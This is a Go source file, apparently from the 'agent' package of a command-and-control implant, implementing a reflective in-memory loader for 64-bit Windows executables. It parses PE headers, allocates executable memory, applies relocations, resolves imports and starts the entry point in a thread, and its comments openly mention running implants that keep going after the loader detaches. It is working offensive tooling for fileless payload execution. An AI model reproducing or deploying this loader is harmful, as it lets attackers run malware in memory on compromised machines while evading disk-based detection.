//go:build windows

package agent

// execPE is a minimal in-process PE loader for x64 EXEs.
//
// Phases:
//  1. Parse and validate PE headers (DOS→NT→Optional, PE32+ only)
//  2. VirtualAlloc the full image at the preferred base (or any address)
//  3. Copy PE headers and sections into allocated memory
//  4. Apply base relocations (IMAGE_REL_BASED_DIR64, type 10)
//  5. Resolve the import address table via LoadLibraryA + GetProcAddress
//  6. Set per-section memory protections via VirtualProtect
//  7. Spawn a thread at the entry point; wait up to 10 s then detach

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// execPE loads raw PE bytes and executes the image in-process.
// cmdArgs is informational only; the entry point receives no argument vector.
func execPE(pebytes []byte, _ string) string {
	if len(pebytes) < 0x40 {
		return "[error: payload too small to be a PE]"
	}

	// ── DOS header ────────────────────────────────────────────────────────────
	if binary.LittleEndian.Uint16(pebytes[0:2]) != 0x5A4D { // "MZ"
		return "[error: missing MZ signature]"
	}
	peOffset := int(binary.LittleEndian.Uint32(pebytes[0x3C:0x40]))
	if peOffset+24 > len(pebytes) {
		return "[error: e_lfanew out of bounds]"
	}
	if binary.LittleEndian.Uint32(pebytes[peOffset:peOffset+4]) != 0x00004550 { // "PE\0\0"
		return "[error: missing PE signature]"
	}

	// ── File header (at peOffset+4) ───────────────────────────────────────────
	machine := binary.LittleEndian.Uint16(pebytes[peOffset+4 : peOffset+6])
	if machine != 0x8664 {
		return fmt.Sprintf("[error: unsupported machine 0x%04X; only AMD64 (0x8664) supported]", machine)
	}
	numSections  := int(binary.LittleEndian.Uint16(pebytes[peOffset+6 : peOffset+8]))
	sizeOfOptHdr := int(binary.LittleEndian.Uint16(pebytes[peOffset+20 : peOffset+22]))

	// ── Optional header (PE32+, magic = 0x020B) ───────────────────────────────
	optOff := peOffset + 24
	if optOff+2 > len(pebytes) || binary.LittleEndian.Uint16(pebytes[optOff:optOff+2]) != 0x020B {
		return "[error: not a PE32+ (64-bit) image]"
	}

	// AddressOfEntryPoint at optOff+16 (RVA, 4 bytes)
	entryRVA := binary.LittleEndian.Uint32(pebytes[optOff+16 : optOff+20])
	// ImageBase at optOff+24 (8 bytes for PE32+)
	preferredBase := binary.LittleEndian.Uint64(pebytes[optOff+24 : optOff+32])
	// SizeOfImage at optOff+56
	sizeOfImage := int(binary.LittleEndian.Uint32(pebytes[optOff+56 : optOff+60]))
	// SizeOfHeaders at optOff+60
	sizeOfHdrs := int(binary.LittleEndian.Uint32(pebytes[optOff+60 : optOff+64]))

	// DataDirectory for PE32+ starts at optOff+112.
	// Each entry: VA(4 bytes) + Size(4 bytes).
	//   [1] Import table  at optOff+112+8  = optOff+120
	//   [5] Base reloc    at optOff+112+40 = optOff+152
	var impVA, impSize, relocVA, relocSize uint32
	ddBase := optOff + 112
	if ddBase+16 <= len(pebytes) {
		impVA   = binary.LittleEndian.Uint32(pebytes[ddBase+8 : ddBase+12])
		impSize = binary.LittleEndian.Uint32(pebytes[ddBase+12 : ddBase+16])
	}
	if ddBase+48 <= len(pebytes) {
		relocVA   = binary.LittleEndian.Uint32(pebytes[ddBase+40 : ddBase+44])
		relocSize = binary.LittleEndian.Uint32(pebytes[ddBase+44 : ddBase+48])
	}

	// ── Section table ─────────────────────────────────────────────────────────
	// IMAGE_SECTION_HEADER (40 bytes each):
	//   +8   VirtualSize
	//   +12  VirtualAddress (RVA)
	//   +16  SizeOfRawData
	//   +20  PointerToRawData
	//   +36  Characteristics
	type peSection struct {
		virtAddr    uint32
		virtSize    uint32
		rawOffset   uint32
		rawSize     uint32
		characteristics uint32
	}
	secTableOff := optOff + sizeOfOptHdr
	sections := make([]peSection, 0, numSections)
	for i := 0; i < numSections; i++ {
		off := secTableOff + i*40
		if off+40 > len(pebytes) {
			break
		}
		sections = append(sections, peSection{
			virtSize:        binary.LittleEndian.Uint32(pebytes[off+8 : off+12]),
			virtAddr:        binary.LittleEndian.Uint32(pebytes[off+12 : off+16]),
			rawSize:         binary.LittleEndian.Uint32(pebytes[off+16 : off+20]),
			rawOffset:       binary.LittleEndian.Uint32(pebytes[off+20 : off+24]),
			characteristics: binary.LittleEndian.Uint32(pebytes[off+36 : off+40]),
		})
	}

	// ── Resolve kernel32 procs ───────────────────────────────────────────────
	virtualAlloc   := kernel32.NewProc("VirtualAlloc")
	virtualProtect := kernel32.NewProc("VirtualProtect")
	createThread   := kernel32.NewProc("CreateThread")
	waitForSingle  := kernel32.NewProc("WaitForSingleObject")
	loadLibA       := kernel32.NewProc("LoadLibraryA")
	getProcAddr    := kernel32.NewProc("GetProcAddress")

	// ── Phase 2: Allocate memory ──────────────────────────────────────────────
	const allocFlags = uintptr(windows.MEM_COMMIT | windows.MEM_RESERVE)
	const rwxProt    = uintptr(windows.PAGE_EXECUTE_READWRITE)

	// Try preferred base first; fall back to any address if taken.
	imageBase, _, _ := virtualAlloc.Call(
		uintptr(preferredBase), uintptr(sizeOfImage), allocFlags, rwxProt)
	if imageBase == 0 {
		imageBase, _, _ = virtualAlloc.Call(0, uintptr(sizeOfImage), allocFlags, rwxProt)
	}
	if imageBase == 0 {
		return "[error: VirtualAlloc failed]"
	}

	// ── Phase 3a: Copy PE headers ─────────────────────────────────────────────
	if sizeOfHdrs > len(pebytes) {
		sizeOfHdrs = len(pebytes)
	}
	hdrDst := unsafe.Slice((*byte)(unsafe.Pointer(imageBase)), sizeOfHdrs)
	copy(hdrDst, pebytes[:sizeOfHdrs])

	// ── Phase 3b: Copy sections ───────────────────────────────────────────────
	for _, sec := range sections {
		if sec.rawSize == 0 || sec.rawOffset == 0 {
			continue
		}
		srcEnd := int(sec.rawOffset) + int(sec.rawSize)
		if srcEnd > len(pebytes) {
			continue
		}
		if uint64(sec.virtAddr)+uint64(sec.rawSize) > uint64(sizeOfImage) {
			continue
		}
		dst := unsafe.Slice((*byte)(unsafe.Pointer(imageBase+uintptr(sec.virtAddr))), sec.rawSize)
		copy(dst, pebytes[sec.rawOffset:srcEnd])
	}

	// ── Phase 4: Base relocations ─────────────────────────────────────────────
	delta := int64(imageBase) - int64(preferredBase)
	if delta != 0 && relocVA != 0 && relocSize != 0 {
		relocBase := imageBase + uintptr(relocVA)
		relocEnd  := relocBase + uintptr(relocSize)
		for ptr := relocBase; ptr+8 <= relocEnd; {
			blockVA   := *(*uint32)(unsafe.Pointer(ptr))
			blockSize := *(*uint32)(unsafe.Pointer(ptr + 4))
			if blockSize < 8 {
				break
			}
			if uintptr(blockSize) > relocEnd-ptr {
				break // corrupt block
			}
			count := (blockSize - 8) / 2
			for j := uint32(0); j < count; j++ {
				entry := *(*uint16)(unsafe.Pointer(ptr + 8 + uintptr(j)*2))
				typ   := entry >> 12
				off   := uint32(entry & 0x0FFF)
				if typ == 10 { // IMAGE_REL_BASED_DIR64
					patchAddr := (*int64)(unsafe.Pointer(imageBase + uintptr(blockVA) + uintptr(off)))
					*patchAddr += delta
				}
			}
			ptr += uintptr(blockSize)
		}
	}

	// ── Phase 5: Import address table ─────────────────────────────────────────
	// IMAGE_IMPORT_DESCRIPTOR (20 bytes each, null-terminated array):
	//   +0   OriginalFirstThunk (RVA of INT; 0 → use FirstThunk as INT)
	//   +12  Name              (RVA of DLL name string)
	//   +16  FirstThunk        (RVA of IAT)
	//
	// IMAGE_THUNK_DATA64 entries are 8 bytes:
	//   bit 63 set  → ordinal (bits 0-15)
	//   bit 63 clear → RVA to IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[]; }
	if impVA != 0 && impSize != 0 {
		for descOff := uintptr(impVA); ; descOff += 20 {
			descPtr        := imageBase + descOff
			origFirstThunk := *(*uint32)(unsafe.Pointer(descPtr + 0))
			nameRVA        := *(*uint32)(unsafe.Pointer(descPtr + 12))
			firstThunk     := *(*uint32)(unsafe.Pointer(descPtr + 16))
			if nameRVA == 0 {
				break // null terminator
			}

			dllNameZ := cstrFromPtr(imageBase+uintptr(nameRVA)) + "\x00"
			dllNameB := []byte(dllNameZ)
			hDLL, _, _ := loadLibA.Call(uintptr(unsafe.Pointer(&dllNameB[0])))
			_ = dllNameB // keep alive
			if hDLL == 0 {
				continue // DLL not found; skip (will cause AV on first call)
			}

			intRVA := origFirstThunk
			if intRVA == 0 {
				intRVA = firstThunk // some linkers omit INT; use IAT as both
			}
			intBase := imageBase + uintptr(intRVA)
			iatBase := imageBase + uintptr(firstThunk)

			for j := uintptr(0); ; j += 8 {
				thunk := *(*uint64)(unsafe.Pointer(intBase + j))
				if thunk == 0 {
					break
				}
				var fnAddr uintptr
				if thunk>>63 == 1 {
					// Ordinal import
					fnAddr, _, _ = getProcAddr.Call(hDLL, uintptr(thunk&0xFFFF))
				} else {
					// Named import: thunk is RVA to IMAGE_IMPORT_BY_NAME
					// Skip the 2-byte Hint field to reach the name.
					fnNamePtr := imageBase + uintptr(thunk) + 2
					fnNameZ := cstrFromPtr(fnNamePtr) + "\x00"
					fnNameB := []byte(fnNameZ)
					fnAddr, _, _ = getProcAddr.Call(hDLL, uintptr(unsafe.Pointer(&fnNameB[0])))
					_ = fnNameB
				}
				*(*uintptr)(unsafe.Pointer(iatBase + j)) = fnAddr
			}
		}
	}

	// ── Phase 6: Per-section memory protections ───────────────────────────────
	for _, sec := range sections {
		if sec.rawSize == 0 {
			continue
		}
		prot := peCharsToProt(sec.characteristics)
		var oldProt uint32
		virtualProtect.Call(
			imageBase+uintptr(sec.virtAddr),
			uintptr(sec.rawSize),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProt)),
		)
	}

	// ── Phase 7: Execute entry point ──────────────────────────────────────────
	ep := imageBase + uintptr(entryRVA)
	hThread, _, _ := createThread.Call(0, 0, ep, 0, 0, 0)
	if hThread == 0 {
		return "[error: CreateThread failed]"
	}
	// Wait up to 10 s; if the PE keeps running (e.g. it's an implant), detach.
	r, _, _ := waitForSingle.Call(hThread, 10000)
	windows.CloseHandle(windows.Handle(hThread))
	if uint32(r) == 0x00000102 { // WAIT_TIMEOUT
		return "[+] PE executing (async — entry point did not return within 10 s)"
	}
	return "[+] PE executed and returned"
}

// cstrFromPtr reads a null-terminated ASCII string from an arbitrary memory address.
func cstrFromPtr(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var buf []byte
	for {
		b := *(*byte)(unsafe.Pointer(ptr))
		if b == 0 {
			break
		}
		buf = append(buf, b)
		ptr++
	}
	return string(buf)
}

// peCharsToProt maps IMAGE_SCN_* section characteristics to VirtualProtect PAGE_* flags.
func peCharsToProt(chars uint32) uint32 {
	const (
		scnExec  = 0x20000000
		scnRead  = 0x40000000
		scnWrite = 0x80000000
	)
	exec  := chars&scnExec != 0
	write := chars&scnWrite != 0
	switch {
	case exec && write:
		return windows.PAGE_EXECUTE_READWRITE
	case exec:
		return windows.PAGE_EXECUTE_READ
	case write:
		return windows.PAGE_READWRITE
	default:
		return windows.PAGE_READONLY
	}
}
